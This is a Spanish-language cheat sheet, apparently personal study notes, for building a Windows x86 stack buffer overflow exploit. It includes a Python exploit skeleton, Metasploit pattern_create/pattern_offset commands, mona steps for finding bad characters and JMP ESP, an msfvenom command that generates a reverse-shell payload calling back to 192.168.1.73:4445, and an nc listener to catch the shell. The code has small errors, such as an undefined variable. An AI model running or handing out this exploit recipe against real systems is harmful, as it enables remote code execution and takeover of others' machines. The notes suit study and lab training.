**averiguar offset**
lanzar "A"\*200
python \-c "print "A"\*100" \|nc ip puerto

<br>
<br>
***

**\- Esqueleto bof**

#!/usr/bin/python
import socket
import sys
from struct import pack

\#\# basura = "A"\*1052 /identifacion de offset
\#\# EIP = pack\("<I"\,0x68A98A7B\) //little endian //aca primerose pone el "B"\*4
\#\# shellcode = //se usa para crear el payload con mfsvenom
\#\# NOPS = "\\x90"\*15 //esto se usa para dar espacio al shellcode para desempaquetar
\#\# Payload = basura \+ EIP \+ NOPS \+ shellcode
s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
s.connect(('localhost', 8888))
s.sendall((Payload))
#data = s.recv(8096)
s.close()
print 'Paylad enviado!', repr(data)

***

<br>
<br>
<br>
**\- conociendo el volcado\, se hace offset con patter**
usr/share/metasploit-framework/tools/exploit/pattern\_create.rb 5000 // se pone en basura, se saca el eip y se busca con patter\_offset
/usr/share/metasploit-framework/tools/exploit/pattern\_offset.rb -q 316A4230 // con esto ya se identifica el offset y queda la basura "316A4230 es el EIP"
\- se pasa el EIP "B"\*4 y despues se pasa el ESP de arriba "C"\*100 <\- esto se convierte en el badchar/shellcode bytearay

<br>
**\- eliminar los badchars/shellcode\, usar mona**
!mona config -set workingfolder path\\%p
!mona bytearray
!mona compare -f path\\bytearray.bin -a ESP\_arriba
!mona bytearray -cbp "\\x00" \<se debe colocar todos los que salgan en el compare>

<br>
**\- generar shellcode**
msfvenom -p windows/shell\_reverse\_tcp LHOST=192.168.1.73 LPORT=4445 -a x86 --platform windows EXITFUNC=thread -b "\\x00" -f c

<br>
!mona modules >>>> aca se debe escoger una libreria que tenga todo false, importante el ASLR (proteccion de memeoria desahbiltado)

<br>
\-\-\-\-\- "\\xFF\\xE4" = 32bits

<br>
!mona find -s "\\xFF\\xE4" -m modulo identificado "\*\*\*\*.dll" << cuando se encuentra se escoge uno de los que estan y se da doble clic, sebe mandar a un jmp esp>>
se seleccionar la direccion de ese jmp esp y se cambia en el EIP del codigo "B"\*4, se debe hacer el little endian

<br>
EIP = pack("<I",0xaabbccddee)

<br>
<br>
\-\-\-\-agregar nops = "\\x90"\*15

<br>
Payload = basura + EIP + NOPS + shellcode

<br>
**\- abrir nc con el puerto especificado nc \-lnvp 4445**
./payload